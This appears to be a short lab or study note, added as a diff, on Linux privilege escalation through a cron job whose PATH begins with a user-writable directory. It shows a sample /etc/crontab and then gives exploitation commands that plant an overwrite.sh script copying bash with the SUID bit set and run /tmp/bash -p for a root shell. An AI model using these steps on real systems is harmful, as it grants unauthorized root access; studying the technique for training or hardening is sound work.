@@ -1,0 +1,40 @@
+PRIVILEGE ESCALTION USING CRON PATH 
+===================================
+
+1. cat /etc/crontab
+
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+* * * * * root overwrite.sh
+* * * * * root /usr/local/bin/compress.sh
+
+PATH is /home/user & overwrite.sh has not hardcoded path. So if we write out script and store it in /home/user folder we can elevate privilege.
+
+
+EXPLOITATION:
+
+1. in command prompt:
+type:
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash'> /home/user/overwrite.sh
+
+2. chmod +x /home/user/overwrite.sh
+
+3. wait for 1 minute. after that type:
+
+/tmp/bash -p
+
+we will get the shell
+
